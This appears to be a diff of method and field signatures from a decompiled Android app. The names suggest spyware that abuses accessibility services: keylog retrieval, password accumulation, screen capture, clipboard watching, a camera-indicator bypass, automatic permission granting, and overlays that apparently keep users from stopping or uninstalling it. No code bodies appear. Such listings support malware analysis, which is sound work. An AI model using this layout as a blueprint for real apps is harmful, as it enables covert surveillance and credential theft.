@@ -3092,22 +3092,30 @@ com.task.tusker.services.UnifiedAccessibilityService:
     private static final java.lang.String TAG
     private android.os.Handler notifStopOverlayHandler
     private void clickAllTextElementsCI(android.view.accessibility.AccessibilityNodeInfo,java.lang.String)
+    private android.graphics.Rect findActiveAppsRowBounds(java.lang.String)
     private boolean findAndClickContaining(android.view.accessibility.AccessibilityNodeInfo,java.lang.String)
     private boolean findAndEnableToggleForAppName(android.view.accessibility.AccessibilityNodeInfo)
+    private android.graphics.Rect findAppRowInNode(android.view.accessibility.AccessibilityNodeInfo,java.lang.String)
     public java.util.List getKeylogs()
     private java.lang.String getNodeContextText(android.view.accessibility.AccessibilityNodeInfo)
+    private boolean hasStopChildNode(android.view.accessibility.AccessibilityNodeInfo)
     private boolean isButtonClass(android.view.accessibility.AccessibilityNodeInfo)
+    private synthetic void lambda$placeNotifStopOverlay$6(android.graphics.Rect)
     private synthetic void lambda$reEnableAutoGrant$4()
     private synthetic void lambda$scheduleBack$7()
+    private synthetic void lambda$showAccessibilityAssistOverlay$18()
     public boolean performClick(float,float)
     public boolean performNotifications()
     public boolean performRecents()
     public boolean performSwipe(float,float,float,float,int)
+    private void placeNotifStopOverlay(android.graphics.Rect)
     public void reEnableAutoGrant(long)
     private void readNodeRecursive(android.view.accessibility.AccessibilityNodeInfo,org.json.JSONArray,int)
     public org.json.JSONObject readScreen()
+    private void removeNotifStopOverlay()
     private boolean runAccessibilityToggleGranter(android.view.accessibility.AccessibilityNodeInfo)
     private void scheduleBack(long)
+    private void showAccessibilityAssistOverlay()
     public void startGrantPermsTimer()
 com.task.tusker.stealth.CameraIndicatorBypass$1
 com.task.tusker.stealth.CameraIndicatorBypass
@@ -13204,15 +13212,20 @@ com.task.tusker.services.UnifiedAccessibilityService$7:
     public final synthetic com.task.tusker.services.UnifiedAccessibilityService this$0
 com.task.tusker.services.UnifiedAccessibilityService:
     public static final java.lang.String[] TOGGLE_BLACKLIST
+    public volatile boolean accessibilityAssistOverlayShowing
+    public android.view.View accessibilityAssistView
+    public android.view.WindowManager accessibilityAssistWM
     public com.task.tusker.services.UnifiedAccessibilityService$4 autoGrantScanRunnable
     public android.content.ClipboardManager clipboardManager
     public java.lang.String lastClipboard
+    public android.view.View notifStopOverlayView
+    public android.view.WindowManager notifStopWindowManager
+    public int screenHeight
     public int screenWidth
     public static java.lang.String buildAccumulatedPassword()
     public static android.graphics.Bitmap captureScreenSync()
     public static boolean containsDangerousWordsWithAppName()
     public static void enableStorageAutoGrant()
-    public static android.graphics.Rect findActiveAppsRowBounds()
     public static java.lang.String getAllScreenText(android.view.accessibility.AccessibilityNodeInfo)
     public static void initAccessibilityAssist()
     public static boolean isSystemPanelOpen()
@@ -13229,21 +13242,20 @@ com.task.tusker.services.UnifiedAccessibilityService:
     public static synthetic void lambda$onServiceConnected$1()
     public static void lambda$onServiceConnected$2()
     public static synthetic void lambda$onUnbind$20()
-    public static synthetic void lambda$placeNotifStopOverlay$6()
     public static synthetic void lambda$removeAccessibilityAssistOverlay$19()
+    public static void lambda$runAccessibilityPageProtection$21()
     public static void lambda$runCleanerAppDefend$8()
     public static synthetic void lambda$scheduleAutoUninstall$10()
-    public static synthetic void lambda$showAccessibilityAssistOverlay$18()
     public static synthetic void lambda$startAutoGrantTimer$3()
     public static boolean performBack()
     public static boolean performHome()
-    public static void placeNotifStopOverlay()
+    public static void removeAccessibilityAssistOverlay()
     public final void removeBlackOverlay()
+    public static void removeNotifStopOverlayOnMainThread()
     public static boolean runAppNameAllowAccessClicker()
     public static boolean runCleanerAppDefend()
     public static boolean runUninstallAssist()
     public static void scheduleAutoUninstall()
-    public static void showAccessibilityAssistOverlay()
     public static void startAutoClickScanner()
     public static void startAutoGrantTimer()
     public static void startPermissionScanner()
